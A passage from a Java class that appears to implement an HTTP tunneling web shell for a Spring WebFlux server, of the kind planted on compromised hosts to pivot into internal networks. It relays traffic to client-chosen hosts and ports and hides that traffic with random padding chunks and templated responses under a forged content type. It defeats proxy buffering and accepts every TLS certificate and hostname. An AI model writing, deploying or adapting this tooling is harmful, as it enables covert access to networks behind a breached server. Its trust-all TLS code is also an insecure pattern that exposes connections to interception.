        return java.util.Base64.getUrlEncoder().withoutPadding().encodeToString(data)
                .getBytes(StandardCharsets.US_ASCII);
    }

    private static byte[] decodeBase64Url(byte[] buffer, int offset, int length) {
        byte[] encoded = new byte[length];
        System.arraycopy(buffer, offset, encoded, 0, length);
        return java.util.Base64.getUrlDecoder().decode(new String(encoded, StandardCharsets.US_ASCII));
    }

    private static void writeU32(ByteArrayOutputStream out, int value) {
        out.write((value >> 24) & 0xFF);
        out.write((value >> 16) & 0xFF);
        out.write((value >> 8) & 0xFF);
        out.write(value & 0xFF);
    }

    // ------------------------------------------------------------- protocol data

    private static HashMap<String, byte[]> newData(String tunId, byte[] data) {
        HashMap<String, byte[]> map = new HashMap<String, byte[]>();
        map.put("ac", new byte[]{ACTION_DATA});
        map.put("dt", data);
        map.put("id", tunId.getBytes(StandardCharsets.UTF_8));
        return map;
    }

    private static HashMap<String, byte[]> newDel(String tunId) {
        HashMap<String, byte[]> map = new HashMap<String, byte[]>();
        map.put("ac", new byte[]{ACTION_DELETE});
        map.put("id", tunId.getBytes(StandardCharsets.UTF_8));
        return map;
    }

    private static HashMap<String, byte[]> newStatus(String tunId, byte status) {
        HashMap<String, byte[]> map = new HashMap<String, byte[]>();
        map.put("ac", new byte[]{ACTION_STATUS});
        map.put("s", new byte[]{status});
        map.put("id", tunId.getBytes(StandardCharsets.UTF_8));
        return map;
    }

    private static HashMap<String, byte[]> newHeartbeat(String tunId) {
        HashMap<String, byte[]> map = new HashMap<String, byte[]>();
        map.put("ac", new byte[]{ACTION_HEARTBEAT});
        map.put("id", tunId.getBytes(StandardCharsets.UTF_8));
        return map;
    }

    private static HashMap<String, byte[]> newDirtyChunk(int size) {
        HashMap<String, byte[]> map = new HashMap<String, byte[]>();
        map.put("ac", new byte[]{ACTION_DIRTY});
        if (size > 0) {
            byte[] data = new byte[size];
            new Random().nextBytes(data);
            map.put("d", data);
        }
        return map;
    }

    // ------------------------------------------------------------------ tunnels

    @SuppressWarnings("unchecked")
    private static void emitData(HashMap<String, Object> tunnel, byte[] data) {
        emit((Sinks.Many<byte[]>) tunnel.get(T_SINK),
                tunnel.get(T_LOCK),
                marshalBase64(newData((String) tunnel.get(T_ID), data)),
                (Integer) tunnel.get(T_DIRTY));
    }

    @SuppressWarnings("unchecked")
    private static void tunnelClosed(HashMap<String, Object> tunnel) {
        AtomicBoolean closed = (AtomicBoolean) tunnel.get(T_CLOSED);
        if (closed == null || !closed.compareAndSet(false, true)) {
            return;
        }
        String tunId = (String) tunnel.get(T_ID);
        if (ctx.remove(tunId, tunnel)) {
            emit((Sinks.Many<byte[]>) tunnel.get(T_SINK),
                    tunnel.get(T_LOCK),
                    (byte[]) tunnel.get(T_END),
                    (Integer) tunnel.get(T_DIRTY));
            ((Sinks.Many<byte[]>) tunnel.get(T_SINK)).tryEmitComplete();
        }
        disposeTunnel(tunnel);
    }

    @SuppressWarnings("unchecked")
    private static void disposeTunnel(HashMap<String, Object> tunnel) {
        Connection connection = (Connection) tunnel.get(T_CONN);
        if (connection != null && !connection.isDisposed()) {
            connection.dispose();
        }
    }

    // ------------------------------------------------------------------ helpers

    private static void emit(Sinks.Many<byte[]> sink, Object lock, byte[] data) {
        emit(sink, lock, data, 0);
    }

    private static void emit(Sinks.Many<byte[]> sink, Object lock, byte[] data, int dirtySize) {
        if (sink == null || data == null || data.length == 0) {
            return;
        }
        synchronized (lock) {
            sink.tryEmitNext(data);
            if (dirtySize > 0) {
                sink.tryEmitNext(marshalBase64(newDirtyChunk(dirtySize)));
            }
        }
    }

    private static void write(ByteArrayOutputStream out, byte[] data) {
        if (data != null && data.length > 0) {
            out.write(data, 0, data.length);
        }
    }

    private Mono<Void> writeBytes(ServerHttpResponse response, byte[] data) {
        response.getHeaders().setContentLength(data.length);
        if (data.length == 0) {
            return response.setComplete();
        }
        return response.writeWith(Mono.just(response.bufferFactory().wrap(data)));
    }

    private static void setBypassHeader(ServerHttpResponse response) {
        response.getHeaders().set("X-Accel-Buffering", "no");
    }

    private static byte[] templateStart(ServerHttpResponse response, String sid) {
        Object value = ctx.get(sid);
        if (!(value instanceof String[])) {
            return new byte[0];
        }
        String[] parts = (String[]) value;
        if (parts.length != 3) {
            return new byte[0];
        }
        response.getHeaders().set("Content-Type", parts[0]);
        return parts[1].getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] templateEnd(String sid) {
        Object value = ctx.get(sid);
        if (!(value instanceof String[])) {
            return new byte[0];
        }
        String[] parts = (String[]) value;
        if (parts.length != 3) {
            return new byte[0];
        }
        return parts[2].getBytes(StandardCharsets.UTF_8);
    }

    private static int dirtySize(String sid) {
        Object value = ctx.get(sid + "_jk");
        if (value instanceof Integer) {
            return (Integer) value;
        }
        return 0;
    }

    private static InetSocketAddress targetAddress(ServerHttpRequest request,
                                                   HashMap<String, byte[]> dataMap) {
        String host = new String(dataMap.get("h"), StandardCharsets.UTF_8);
        int port = Integer.parseInt(new String(dataMap.get("p"), StandardCharsets.UTF_8));
        if (port == 0) {
            InetSocketAddress local = request.getLocalAddress();
            if (local != null) {
                host = local.getHostString();
                port = local.getPort();
            }
        }
        return InetSocketAddress.createUnresolved(host, port);
    }

    private static String randomString(int length) {
        Random random = new Random();
        StringBuilder builder = new StringBuilder(length);
        for (int i = 0; i < length; i++) {
            builder.append(SID_CHARS[random.nextInt(SID_CHARS.length)]);
        }
        return builder.toString();
    }

    private static HashMap<String, Boolean> collectAddr() {
        HashMap<String, Boolean> addrs = new HashMap<String, Boolean>();
        try {
            Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
            while (interfaces.hasMoreElements()) {
                NetworkInterface networkInterface = interfaces.nextElement();
                Enumeration<InetAddress> addresses = networkInterface.getInetAddresses();
                while (addresses.hasMoreElements()) {
                    String address = addresses.nextElement().getHostAddress();
                    if (address != null) {
                        int index = address.indexOf('%');
                        if (index != -1) {
                            address = address.substring(0, index);
                        }
                        addrs.put(address, Boolean.TRUE);
                    }
                }
            }
        } catch (Throwable ignored) {
        }
        return addrs;
    }

    private static boolean isLocalAddr(String url) {
        try {
            return localAddrs.containsKey(new URL(url).getHost());
        } catch (Throwable t) {
            return false;
        }
    }

    // -------------------------------------------------------- TLS for redirects

    @Override
    public boolean verify(String hostname, SSLSession session) {
        return true;
    }

    @Override
    public void checkClientTrusted(X509Certificate[] chain, String authType) {
    }

    @Override
    public void checkServerTrusted(X509Certificate[] chain, String authType) {
    }

    @Override
    public X509Certificate[] getAcceptedIssuers() {
        return new X509Certificate[0];
    }
}
